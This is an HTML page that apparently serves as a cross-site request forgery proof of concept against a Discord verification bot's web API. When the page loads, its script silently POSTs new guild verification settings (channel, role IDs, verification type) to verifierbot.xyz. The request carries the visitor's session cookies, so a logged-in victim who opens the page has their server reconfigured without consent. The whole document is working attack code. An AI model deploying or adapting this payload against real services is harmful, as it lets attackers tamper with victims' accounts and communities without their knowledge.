<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Automatic JSON Form Submission</title>
</head>
<body>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Form data object
      var formData = {
        welcomeMessage: "h",
        welcomeChannelID: "1107681605432127630",
        unverifiedRole: ["1107681604878487634"],
        verifiedRoles: ["1202354378321965126", "", ""],
        verificationType: "web",
        emoji: {
          name: "ðŸ˜€"
        }
      };

      // Convert form data to JSON
      var jsonData = JSON.stringify(formData);

      // Fetch options
      var fetchOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'token': 'undefined' // Replace with your actual token if needed
        },
        body: jsonData,
        mode: 'cors',
        credentials: 'include'
      };

      // Fetch request
      fetch('https://verifierbot.xyz/api/@me/guilds/1107681604878487634/verification', fetchOptions)
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          console.log(data); // Handle the response data as needed
        })
        .catch(error => {
          console.error('Error:', error);
        });
    });
  </script>

</body>
</html>
